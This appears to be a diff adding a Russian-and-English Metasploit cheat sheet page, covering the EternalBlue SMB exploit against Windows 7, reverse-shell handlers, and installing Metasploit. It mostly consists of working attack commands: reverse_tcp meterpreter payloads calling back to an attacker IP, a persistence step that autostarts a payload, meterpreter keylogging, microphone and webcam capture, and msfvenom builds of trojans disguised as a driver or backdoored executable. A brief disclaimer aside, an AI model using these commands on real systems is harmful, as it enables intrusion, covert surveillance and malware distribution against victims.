@@ -1,0 +1,145 @@
+<h2>Пост создан в ознакомительных целях, использование в отношении других людей чревато #
+</h2>
+Запускаем
+<pre>msfconsole
+</pre>
+Выбираем для примера эксплоит eternalblue, в данном случае эксплоит предназначен на машины Windows 7 (x86 и x64) Windows Server
+2008 (x64) с выкинутой на ружу smb папкой (общие папки)
+<pre>use exploit/windows/smb/ms17_010_eternalblue
+</pre>
+
+<hr>
+
+На ресурсах ссылаются на то, что нужно выбирать процесс в зависимости от ОС, но забегая наперед шела мне получить
+не удалось (только отказ в обслуживании\\синий экран на машине жертвы). Выполнение команд считаю опциональной.
+Если у жертвы стоит 32-битная система, то прописываем команду
+<pre>set process inject wlms.exe
+</pre>
+Если на компьютере жертвы стоит 64-битная ОС
+<pre>set process inject lsass.exe
+</pre>
+
+<hr>
+
+Для полезной нагрузки выбираем реверс шел (опционально, команда для полноты гайда, использоваться не будет,
+если конечно вы чудом получите шел и машина жертвы не уйдет в перезагрузку)
+<pre>set payload windows/x64/meterpreter/reverse_tcp
+</pre>
+
+<hr>
+
+Прописываем IP жертвы
+<pre>set rhost 192.168...
+</pre>
+Прописываем свой IP
+<pre>set lhost 192.168..
+</pre>
+Запускаем выполнение эксплоита
+<pre>exploit
+</pre>
+<p>Ждем <s>получение реверс шела</s> синего экрана на машине жертвы)
+</p>
+<p>Заметки по работе с metasploit буду складывать 
+<a href="https://itcompressor.github.io/#?target=metasploit">тут на itcompressor</a>
+</p>
+
+
+<br><br>
+
+Install dependenices
+<pre>sudo apt-get install build-essential libreadline-dev libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev git-core autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev libyaml-dev curl zlib1g-dev gawk bison libffi-dev libgdbm-dev libncurses5-dev libtool sqlite3 libgmp-dev gnupg2 dirmngr nmap
+</pre>
+Install ruby + configure Postgresql SQL Server (if use zsh change '.bashrc' to '.zshrc')
+<pre>cd ~
+git clone git://github.com/sstephenson/rbenv.git .rbenv
+echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
+echo 'eval "$(rbenv init -)"' >> ~/.bashrc
+exec $SHELL
+
+git clone git://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-build
+echo 'export PATH="$HOME/.rbenv/plugins/ruby-build/bin:$PATH"' >> ~/.bashrc
+
+# sudo plugin so we can run Metasploit as root with "rbenv sudo msfconsole" 
+git clone git://github.com/dcarley/rbenv-sudo.git ~/.rbenv/plugins/rbenv-sudo
+
+exec $SHELL
+
+RUBYVERSION=$(wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/.ruby-version -q -O - )
+rbenv install $RUBYVERSION
+rbenv global $RUBYVERSION
+ruby -v
+
+echo "export PATH=$PATH:/usr/lib/postgresql/10/bin" >> ~/.bashrc
+. ~/.bashrc 
+</pre>
+Install and run metasploit-framework
+<pre>git clone https://github.com/rapid7/metasploit-framework.git
+cd metasploit-framework
+gem install bundler
+bundle install
+./msfdb init
+msfconsole
+</pre>
+
+<hr>
+
+Use reverse tcp shell (full mini guide)
+<pre>msfconsole
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+        
+set LHOST 192.168.0.196
+set LPORT 4444
+        
+run
+</pre>
+Get any info about cerrent state
+<pre>
+info
+options
+</pre>
+Create autostart for payload
+<pre>run post/windows/manage/persistence_exe REXEPATH=/local/path/to/your/payload.exe REXENAME=default.exe STARTUP=SYSTEM
+</pre>
+
+<hr>
+
+<h2>meterpreter (reverse shell)</h2>
+Keylogger
+<pre>keyscan_start
+keyscan_dump
+</pre>
+Record audio
+<pre>record_mic
+</pre>
+Start webcam chat
+<pre>webcam_chat
+</pre>
+List webcams
+<pre>webcam_list
+</pre>
+Work with webcam
+<pre>webcam_snap
+webcam_stream
+</pre>
+
+<hr>
+
+<h2>msfvenom (payload tool)</h2>
+Create file with multipayloads
+<pre>msfvenom -p windows/messagebox ICON="INFORMATION" TITLE="Compatibility test" TEXT="The test is processed" -f raw -o mes1
+
+msfvenom -c mes1 -p windows/messagebox ICON="ERROR" TITLE="Error" TEXT="Missing necessary files" -f raw -o mes2
+        
+msfvenom -c mes2 -p windows/meterpreter/reverse_tcp lhost=192.168.0.196 lport=4444 -f exe -o driver_dlya_tvoego_computera.exe
+</pre>
+Another examples
+<pre>msfvenom -a x86 --platform windows -x sol.exe -k -p windows/messagebox lhost=192.168.101.133 -b "\x00" -f exe -o sol_bdoor.exe
+
+msfvenom -p windows/vncinject/reverse_tcp lhost=192.168.0.196 -f exe -o vnc.exe
+</pre>
+<b>-p</b> - payload <br>
+<b>-c</b> - merge in file (for multipayloads) <br>
+<b>-x</b> - template for execute file <br>
+<b>-k</b> - split threads for payload <br>
